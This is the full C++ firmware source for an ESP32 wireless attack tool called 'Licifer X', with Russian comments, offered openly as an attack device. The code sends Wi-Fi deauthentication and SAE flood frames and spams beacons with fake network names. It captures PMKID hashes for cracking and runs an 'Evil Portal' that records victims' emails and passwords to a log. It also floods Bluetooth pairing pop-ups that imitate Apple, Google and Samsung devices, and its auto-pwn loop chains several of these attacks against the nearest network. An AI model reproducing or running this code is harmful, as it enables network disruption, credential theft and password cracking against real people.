#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#include <DNSServer.h>

// ---------- Константы ----------
#define FORMAT_LITTLEFS_IF_FAILED  true
#define AP_SSID                   "Licifer_Setup"
#define AP_PASS                   "12345678"
#define AP_IP                     IPAddress(192,168,4,1)
#define AP_MASK                   IPAddress(255,255,255,0)
#define DNS_PORT                  53

// Протоколы
#define EAPOL_ETHERTYPE_LO        0x88
#define EAPOL_ETHERTYPE_HI        0x8E
#define DEAUTH_REASON_CODE        0x07
#define FRAME_PROBE_REQ_MASK      0xFC
#define FRAME_PROBE_REQ_VALUE     0x40

// BLE пресеты
#define BLE_APPLE_SOUR            0
#define BLE_GOOGLE_FASTPAIR       1
#define BLE_MICROSOFT_SWIFTPAIR   2
#define BLE_SAMSUNG               3
#define BLE_APPLE_JUICE           4

// Память (PSRAM 128KB лог)
#define LOG_BUFFER_SIZE           (128*1024)
#define PMKID_FILE   "/hashes.22000"
#define PORTAL_LOG   "/portal_creds.txt"

// ---------- Глобальные переменные ----------
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
DNSServer dnsServer;
portMUX_TYPE attackMux = portMUX_INITIALIZER_UNLOCKED;

struct AttackState {
    bool deauth   = false;
    bool beacon   = false;
    bool bleSpam  = false;
    bool portal   = false;
    bool pmkidCap = false;
    bool saeFlood = false;
    bool autoPwn  = false;
    bool sniffer  = true; // Активен по дефолту

    uint8_t deauth_bssid[6] = {0};
    uint8_t deauth_ch = 1;
    int beaconCount = 50;
    int bleVariant   = -1;

    uint8_t pmkidBssid[6] = {0};
    uint8_t pmkidCh = 0;

    uint8_t autoPwnTarget[6] = {0};
    uint8_t autoPwnCh = 0;
    int autoPwnPhase = 0;
    int capturedHashes = 0;
} attack;

char* portalLogBuffer = nullptr;
char* pmkidBuffer     = nullptr;
int portalLogLen  = 0;
int pmkidBufferLen = 0;

// ---------- Логирование (PSRAM) ----------
void flushPortalLog() {
    if (!portalLogBuffer || !portalLogLen) return;
    File f = LittleFS.open(PORTAL_LOG, "a");
    if (f) { f.write((uint8_t*)portalLogBuffer, portalLogLen); f.close(); }
    portalLogLen = 0;
}

void flushPMKIDFile() {
    if (!pmkidBuffer || !pmkidBufferLen) return;
    File f = LittleFS.open(PMKID_FILE, "a");
    if (f) { f.write((uint8_t*)pmkidBuffer, pmkidBufferLen); f.close(); }
    pmkidBufferLen = 0;
}

void addPortalLog(const String& s) {
    if (!portalLogBuffer) return;
    if (portalLogLen + s.length() + 2 > LOG_BUFFER_SIZE) flushPortalLog();
    portalLogLen += snprintf(portalLogBuffer + portalLogLen, LOG_BUFFER_SIZE - portalLogLen, "%s\n", s.c_str());
}

void addPMKIDHash(const String& h) {
    if (!pmkidBuffer) return;
    if (pmkidBufferLen + h.length() + 2 > LOG_BUFFER_SIZE) flushPMKIDFile();
    pmkidBufferLen += snprintf(pmkidBuffer + pmkidBufferLen, LOG_BUFFER_SIZE - pmkidBufferLen, "%s\n", h.c_str());
    attack.capturedHashes++;
}

// ---------- Пакетные инъекции ----------
void sendDeauthPacket(const uint8_t* bssid, uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SEC_CHAN_NONE);
    uint8_t pkt[26] = { 0xC0,0x00,0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
    memcpy(pkt+10, bssid, 6);
    memcpy(pkt+16, bssid, 6);
    pkt[24] = DEAUTH_REASON_CODE; pkt[25] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
}

void sendSAEFlood(const uint8_t* bssid, uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SEC_CHAN_NONE);
    uint8_t sae[60] = { 0xB0, 0x00, 0x00, 0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
    memcpy(sae+10, bssid, 6); memcpy(sae+16, bssid, 6);
    sae[24]=0; sae[25]=0; sae[26]=0; sae[27]=0; // Auth algorithm SAE (3)
    sae[28]=0x03; sae[29]=0x00; sae[30]=0x01; sae[31]=0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, sae, 32, false);
}

void sendBeaconFrame(const String& ssid, uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SEC_CHAN_NONE);
    uint8_t bcn[128] = { 0x80,0x00,0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
    for (int j=0; j<6; j++) bcn[10+j] = random(256);
    memcpy(bcn+16, bcn+10, 6);
    bcn[32]=0x64; bcn[33]=0x00; bcn[34]=0x01; bcn[35]=0x04;
    int pos=36; bcn[pos++]=0x00;
    int len = min((int)ssid.length(),32);
    bcn[pos++]=len; memcpy(bcn+pos, ssid.c_str(), len); pos+=len;
    bcn[pos++]=0x01; bcn[pos++]=0x08; bcn[pos++]=0x82; bcn[pos++]=0x84; bcn[pos++]=0x8b; bcn[pos++]=0x96;
    bcn[pos++]=0x03; bcn[pos++]=0x01; bcn[pos++]=ch;
    esp_wifi_80211_tx(WIFI_IF_AP, bcn, pos, false);
}

// ---------- Универсальный Сниффер / PMKID Callback ----------
void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;

    // 1. Сниффер Probe Requests (Karma/Discovery)
    if (type == WIFI_PKT_MGMT && (payload[0] & FRAME_PROBE_REQ_MASK) == FRAME_PROBE_REQ_VALUE) {
        uint8_t ssidLen = payload[25];
        if (ssidLen > 0 && ssidLen <= 32) {
            char ssid[33] = {0}; memcpy(ssid, payload + 26, ssidLen);
            StaticJsonDocument<128> doc;
            doc["type"] = "probe"; doc["ssid"] = ssid;
            char mac[18]; sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", payload[10],payload[11],payload[12],payload[13],payload[14],payload[15]);
            doc["mac"] = mac; String out; serializeJson(doc, out); ws.textAll(out);
        }
    }

    // 2. PMKID Grabber (Data packets)
    if (type == WIFI_PKT_DATA && attack.pmkidCap) {
        if (payload[24] == EAPOL_ETHERTYPE_LO && payload[25] == EAPOL_ETHERTYPE_HI) {
            uint8_t* eapol = payload + 26;
            uint16_t keyLen = (eapol[97] << 8) | eapol[98];
            if (keyLen >= 22) {
                uint8_t* keyData = eapol + 99;
                for (int i=0; i < keyLen - 20; i++) {
                    if (keyData[i] == 0x30 && keyData[i+1] >= 20) {
                        char h[160];
                        sprintf(h, "WPA*01*");
                        for(int j=0; j<16; j++) sprintf(h+strlen(h), "%02x", keyData[i+17+j]);
                        sprintf(h+strlen(h), "*%02x%02x%02x%02x%02x%02x*CLIENT", 
                                attack.pmkidBssid[0], attack.pmkidBssid[1], attack.pmkidBssid[2],
                                attack.pmkidBssid[3], attack.pmkidBssid[4], attack.pmkidBssid[5]);
                        addPMKIDHash(h);
                        attack.pmkidCap = false; // Захват окончен
                    }
                }
            }
        }
    }
}

// ---------- BLE Спам ----------
void startBleAdv(int variant) {
    NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
    pAdv->stop();
    NimBLEAdvertisementData adv;
    switch(variant) {
        case BLE_APPLE_SOUR:
            adv.setFlags(0x1A);
            { uint8_t d[] = {0x1b,0xff,0x4c,0x00,0x01,0x07,0x00,0x01,0x10,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            adv.setManufacturerData(std::string((char*)d,27)); } break;
        case BLE_GOOGLE_FASTPAIR:
            adv.setFlags(0x06);
            { uint8_t m[] = {0x00,0x00,0x00};
            adv.setServiceData(NimBLEUUID("0000fe2c-0000-1000-8000-00805f9b34fb"), std::string((char*)m,3)); } break;
        case BLE_SAMSUNG:
            adv.setFlags(0x06);
            { uint8_t s[] = {0x00,0x00};
            adv.setManufacturerData(0x0075, std::string((char*)s,2)); } break;
    }
    pAdv->setAdvertisementData(adv);
    pAdv->start();
}

// ========== FreeRTOS Задачи ==========
void attackLoop(void*) {
    const char* ssids[] = {"iPhone 15 Pro", "Free_Public_WiFi", "MVD_GUEST_NET", "Starbucks"};
    while(1) {
        if (attack.deauth) sendDeauthPacket(attack.deauth_bssid, attack.deauth_ch);
        if (attack.saeFlood) sendSAEFlood(attack.deauth_bssid, attack.deauth_ch);
        if (attack.beacon) {
            for(int i=0; i<attack.beaconCount; i++) {
                sendBeaconFrame(String(ssids[i%4]) + "_" + String(random(10,99)), random(1,14));
                delay(2);
            }
        }
        vTaskDelay(attack.deauth || attack.saeFlood ? 100 : 500);
    }
}

void autoPwnLoop(void*) {
    while(1) {
        if (attack.autoPwn) {
            // Сканирование -> Выбор цели -> Deauth -> PMKID Capture
            WiFi.scanNetworks(true); vTaskDelay(5000);
            int n = WiFi.scanComplete();
            if (n > 0) {
                int target = 0; // Самый мощный сигнал
                String bssidStr = WiFi.BSSIDstr(target);
                sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &attack.pmkidBssid[0], &attack.pmkidBssid[1], &attack.pmkidBssid[2], &attack.pmkidBssid[3], &attack.pmkidBssid[4], &attack.pmkidBssid[5]);
                attack.pmkidCh = WiFi.channel(target);
                attack.pmkidCap = true;
                for(int i=0; i<20; i++) { sendDeauthPacket(attack.pmkidBssid, attack.pmkidCh); delay(50); }
                vTaskDelay(10000); // Ждем 10 сек захвата
            }
            WiFi.scanDelete();
        }
        vTaskDelay(2000);
    }
}

void bleLoop(void*) {
    NimBLEDevice::init("Licifer_X");
    while(1) {
        if (attack.bleSpam) {
            static int c = 0;
            startBleAdv(attack.bleVariant == -1 ? (c++ % 3) : attack.bleVariant);
            vTaskDelay(300);
        } else vTaskDelay(1000);
    }
}

void webServerInit() {
    ws.onEvent([](AsyncWebSocket*, AsyncWebSocketClient*, AwsEventType type, void*, uint8_t* data, size_t len){
        if (type != WS_EVT_DATA) return;
        StaticJsonDocument<256> doc;
        deserializeJson(doc, data, len);
        String cmd = doc["cmd"];
        
        if (cmd == "start_deauth") {
            sscanf(doc["bssid"]|"", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &attack.deauth_bssid[0], &attack.deauth_bssid[1], &attack.deauth_bssid[2], &attack.deauth_bssid[3], &attack.deauth_bssid[4], &attack.deauth_bssid[5]);
            attack.deauth_ch = doc["ch"]|1; attack.deauth = true;
        } 
        else if (cmd == "stop_deauth") attack.deauth = false;
        else if (cmd == "start_sae") attack.saeFlood = true;
        else if (cmd == "stop_sae") attack.saeFlood = false;
        else if (cmd == "start_portal") { attack.portal = true; dnsServer.start(DNS_PORT, "*", AP_IP); }
        else if (cmd == "stop_portal") { attack.portal = false; dnsServer.stop(); }
        else if (cmd == "start_ble") { attack.bleSpam = true; attack.bleVariant = doc["v"]|-1; }
        else if (cmd == "stop_ble") attack.bleSpam = false;
        else if (cmd == "start_autopwn") attack.autoPwn = true;
        else if (cmd == "stop_autopwn") attack.autoPwn = false;
        else if (cmd == "scan") WiFi.scanNetworks(true);
        else if (cmd == "format") LittleFS.format();
    });

    server.addHandler(&ws);
    server.on("/", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(LittleFS, "/index.html", "text/html"); });
    
    // API для логов
    server.on("/api/portal", HTTP_GET, [](AsyncWebServerRequest* r){ flushPortalLog(); r->send(LittleFS, PORTAL_LOG, "text/plain"); });
    server.on("/api/pmkid", HTTP_GET, [](AsyncWebServerRequest* r){ flushPMKIDFile(); r->send(LittleFS, PMKID_FILE, "text/plain"); });

    // Обработка логина Evil Portal
    server.on("/portal/login", HTTP_POST, [](AsyncWebServerRequest* r){
        String log = "Captured: " + r->arg("email") + " | " + r->arg("password");
        addPortalLog(log);
        r->send(200, "text/html", "<h2>System Updated. You can close this window.</h2>");
    });

    // Редиректы для Captive Portal
    server.onNotFound([](AsyncWebServerRequest* r){
        if (attack.portal) r->redirect("http://192.168.4.1/portal/login");
        else r->send(404);
    });

    server.begin();
}

// ========== Setup & Loop ==========
void setup() {
    Serial.begin(115200);
    
    if (psramFound()) {
        portalLogBuffer = (char*)ps_malloc(LOG_BUFFER_SIZE);
        pmkidBuffer     = (char*)ps_malloc(LOG_BUFFER_SIZE);
        memset(portalLogBuffer, 0, LOG_BUFFER_SIZE);
        memset(pmkidBuffer, 0, LOG_BUFFER_SIZE);
    }

    LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED);
    
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(AP_IP, AP_IP, AP_MASK);
    WiFi.softAP(AP_SSID, AP_PASS);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);

    webServerInit();

    xTaskCreatePinnedToCore(attackLoop, "Atk", 4096, NULL, 2, NULL, 1);
    xTaskCreatePinnedToCore(autoPwnLoop, "Pwn", 4096, NULL, 1, NULL, 1);
    xTaskCreatePinnedToCore(bleLoop, "BLE", 4096, NULL, 1, NULL, 0);
    xTaskCreatePinnedToCore([](void*){ while(1){ if(attack.portal) dnsServer.processNextRequest(); vTaskDelay(10); } }, "DNS", 2048, NULL, 1, NULL, 0);

    Serial.println(">>> Licifer X 3.0 READY");
}

void loop() {
    // Рассылка статуса раз в 2 сек
    StaticJsonDocument<256> s;
    s["deauth"] = attack.deauth; s["ble"] = attack.bleSpam;
    s["portal"] = attack.portal; s["autopwn"] = attack.autoPwn;
    s["pmkid"] = attack.capturedHashes;
    String out; serializeJson(s, out); ws.textAll(out);
    vTaskDelay(2000);
}